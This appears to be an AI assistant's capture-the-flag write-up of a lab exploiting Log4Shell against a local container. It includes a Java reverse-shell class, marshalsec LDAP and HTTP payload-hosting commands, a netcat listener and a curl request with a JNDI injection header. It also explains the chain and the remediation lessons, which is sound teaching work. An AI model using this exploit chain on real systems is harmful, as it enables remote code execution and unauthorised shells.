Log4Shell Vulnerability Exploitation - Flag 2 Success
Congratulations on retrieving Flag 2! Let me provide a detailed explanation of what we did and how the exploit worked:
The Vulnerability
The Log4Shell vulnerability (CVE-2021-44228) is a critical remote code execution flaw in Apache Log4j, a widely used Java logging library. It allows attackers to execute arbitrary code on vulnerable systems by sending specially crafted requests that contain malicious JNDI (Java Naming and Directory Interface) lookup strings.
Our Exploit Process
Here's the step-by-step breakdown of how we achieved remote code execution:
1. Environment Setup
We configured four separate terminals:

Terminal 1: For compiling the exploit code and sending the malicious request
Terminal 2: Python HTTP server to serve our malicious Java class
Terminal 3: LDAP server to handle the JNDI lookup and redirect to our Python server
Terminal 4: Netcat listener to catch the reverse shell connection

2. Creating the Malicious Java Code
We created a Java class (Exploit.java) with a reverse shell payload that would execute when loaded:
javaCopyimport java.io.IOException;
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/9999 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public Exploit() {
        System.out.println("Entering Exploit");
    }
}
This code uses a static initializer block that runs when the class is loaded, executing a bash command to create a reverse shell connection to our listening port.
3. Setting Up the Attack Infrastructure

Python HTTP Server: Started on port 4242 to serve our Exploit.class file
Copypython3 -m http.server 4242

LDAP Server: Started on port 1389 to handle JNDI lookups and redirect to our HTTP server
Copyjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit" 1389

Netcat Listener: Started on port 9999 to receive the reverse shell connection
Copync -nlvp 9999


4. Triggering the Vulnerability
We sent a specially crafted HTTP request to the vulnerable application with a JNDI lookup string in the location header:
Copycurl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:123456789' -H 'location:${jndi:ldap://172.17.0.1:1389/Exploit}'
5. Exploitation Chain

When the vulnerable application received our request, it logged the headers, including our malicious location header
Log4j processed the ${jndi:ldap://172.17.0.1:1389/Exploit} expression and made a JNDI lookup to our LDAP server
Our LDAP server received the request and redirected it to our Python HTTP server at http://172.17.0.1:4242/Exploit.class
The vulnerable application downloaded and loaded our Exploit.class file
When the Java class was loaded, our static initializer block executed, creating a reverse shell connection back to our netcat listener
We gained a shell as the root user on the vulnerable container
We navigated to the correct directory and executed the Flag2.jar file to retrieve the flag

6. Technical Details
This exploit worked because:

The application was using a vulnerable version of Log4j (pre-2.15.0)
It was logging user-controllable input (HTTP headers) without sanitization
The JNDI functionality in Log4j allowed loading of remote Java classes
The application was running with sufficient privileges to execute our commands

7. Security Impact
In a real-world scenario, this vulnerability allows attackers to:

Execute arbitrary code on vulnerable systems
Gain unauthorized access to internal resources
Establish persistence within the network
Exfiltrate sensitive data
Move laterally to other systems

Log4Shell was one of the most severe vulnerabilities discovered in recent years, affecting millions of systems worldwide and leading to a massive remediation effort across the industry.
This exercise demonstrates the importance of keeping dependencies updated, properly configuring security controls, and implementing defense-in-depth strategies to mitigate such vulnerabilities.